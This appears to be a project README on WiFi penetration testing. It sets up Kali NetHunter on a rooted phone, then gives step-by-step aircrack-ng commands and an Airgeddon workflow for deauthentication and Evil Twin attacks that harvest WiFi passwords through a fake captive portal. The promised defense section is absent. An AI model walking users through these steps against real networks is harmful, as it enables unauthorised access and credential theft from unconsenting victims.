# WiFi Penetration Testing & Network Analysis

## Project Overview

This project focuses on analyzing WiFi network security, identifying vulnerabilities, and understanding the impact of wireless attacks such as jamming and rogue access points. It also demonstrates how to distinguish between legitimate and fake WiFi networks, and how such attacks can lead to unauthorized access or credential theft.

The project includes practical demonstrations of two common wireless attacks:

* **Deauthentication Attack**
* **Evil Twin Attack**

Because apparently humanity decided wireless signals flying through the air should somehow also be secure. Bold strategy.

---

# Testing Environment & Tools

## Hardware Used

* Android smartphone
* External WiFi adapter:

  * Alfa Network wireless adapter
* OTG cable for connecting the WiFi adapter to the phone

## Software Used

* Kali NetHunter
* LineageOS (Custom Android ROM)
* Magisk (Root access)
* Aircrack-ng suite
* Airgeddon

---

# Device Preparation

## 1. Installing LineageOS

The original Android operating system was replaced with **LineageOS**, which is a customized Android ROM.

To install a custom ROM:

* The device bootloader was unlocked
* Unlocking the bootloader allows installation of modified operating systems

## 2. Rooting the Device

The device was rooted using:

* **Magisk**

This provides root privileges and full administrative access to the system.

## 3. Installing Kali NetHunter

After rooting:

* Kali NetHunter was flashed onto the device
* A **custom kernel** was required because the device was not officially supported

This setup allows penetration testing tools to run directly from a smartphone instead of a traditional laptop. Tiny cyberpunk laboratory in your pocket. Civilization remains questionable, but technically impressive.

---

# Project Stages

The project went through several phases:

1. Network Analysis
2. Wireless Monitoring
3. Attack Testing
4. Signal Jamming / Deauthentication
5. Problem Analysis & Defense Techniques

---

# Deauthentication Attack

## Step 1: Identify Wireless Interfaces

```bash
ip a s | grep wlan
```

### Purpose

Displays available wireless interfaces.

### Explanation

* `ip a s`

  * Short for `ip address show`
  * Displays all network interfaces

* `|`

  * Pipe operator used to filter output

* `grep wlan`

  * Filters interfaces containing `wlan`

### Example Output

```bash
wlan0   # Internal WiFi adapter
wlan1   # External Alfa adapter
```

---

## Step 2: Enable the External Adapter

```bash
ip link set dev wlan1 up
```

### Purpose

Enables the external WiFi adapter.

### Explanation

* `ip link`

  * Used to manage network interfaces

* `set dev wlan1 up`

  * Activates the adapter

Without this step, the remaining commands will not function correctly. Hardware tends to be annoyingly literal.

---

## Step 3: Enable Monitor Mode

```bash
airmon-ng start wlan1
```

### Purpose

Switches the WiFi adapter from:

* **Managed Mode** → Normal usage
* **Monitor Mode** → Packet monitoring and wireless attacks

### Result

The interface name changes from:

```bash
wlan1
```

to:

```bash
wlan1mon
```

### Why Monitor Mode?

It allows the adapter to:

* Capture nearby wireless traffic
* Monitor all networks in range
* Perform wireless attacks

---

## Step 4: Verify Monitor Mode

```bash
ip a s | grep wlan
```

### Purpose

Confirms that the interface changed to:

```bash
wlan1mon
```

---

## Step 5: Scan Nearby Networks

```bash
airodump-ng wlan1mon
```

### Purpose

Scans nearby WiFi networks.

### Information Displayed

* SSID (Network Name)
* BSSID (MAC Address)
* Channel
* Encryption Type
* Signal Strength

### Goal

Select a target network for analysis or testing.

---

## Step 6: Lock to a Specific Channel

```bash
iwconfig wlan1mon channel 6
```

### Purpose

Locks the adapter onto a single WiFi channel.

### Explanation

* `iwconfig`

  * Configures wireless interfaces

* `channel 6`

  * Focuses monitoring on channel 6

### Benefit

Improves monitoring and attack performance by focusing on one network instead of scanning all channels simultaneously.

---

# Evil Twin Attack

## About the Attack

The Evil Twin attack creates a fake wireless access point that impersonates a legitimate WiFi network.

Victims may unknowingly connect to the fake network and submit sensitive information such as WiFi passwords through a captive portal.

Human beings will connect to literally anything named “Free WiFi” with full confidence. Evolution continues to be experimental.

---

# Using Airgeddon

## Navigate to the Airgeddon Directory

```bash
cd airgeddon
```

## List Files

```bash
ls -1
```

## Run Airgeddon

```bash
sudo ./airgeddon.sh
```

---

# Airgeddon Workflow

## 1. Select Wireless Interface

Choose the external wireless adapter:

```text
wlan0
```

---

## 2. Enable Monitor Mode

From the menu:

```text
2. Put interface in monitor mode
```

Result:

```text
wlan0 → wlan0mon
```

---

## 3. Open Evil Twin Menu

```text
7. Evil Twin attacks menu
```

---

## 4. Explore Available Targets

```text
4. Explore for targets
```

This scans nearby WiFi networks and displays:

* SSID
* Channel
* Encryption
* Connected clients

---

## 5. Select the Target Network

Example:

```text
ESSID: Shkawa
Channel: 11
```

---

## 6. Choose Deauthentication Method

Example option:

```text
2. Deauth aireplay attack
```

### Purpose

Disconnects clients from the legitimate network, forcing them to reconnect.

During reconnection, victims may connect to the fake access point instead.

---

## 7. Capture Handshake / PMKID

Airgeddon attempts to capture:

* WPA/WPA2 Handshake
* PMKID

Example result:

```text
Congratulations!!
PMKID successfully captured
```

---

## 8. Configure the Captive Portal

Choose:

* Captive portal language
* Optional branding/customization

Example:

```text
1. English
```

---

## 9. Launch the Attack

Airgeddon automatically:

* Creates the fake access point
* Launches deauthentication attacks
* Hosts the captive portal

If a victim connects to the fake network and enters the WiFi password into the captive portal, the credentials are captured by the attacker.

Which is a deeply educational reminder that “looks legitimate” has powered scams since humans invented doors.

---
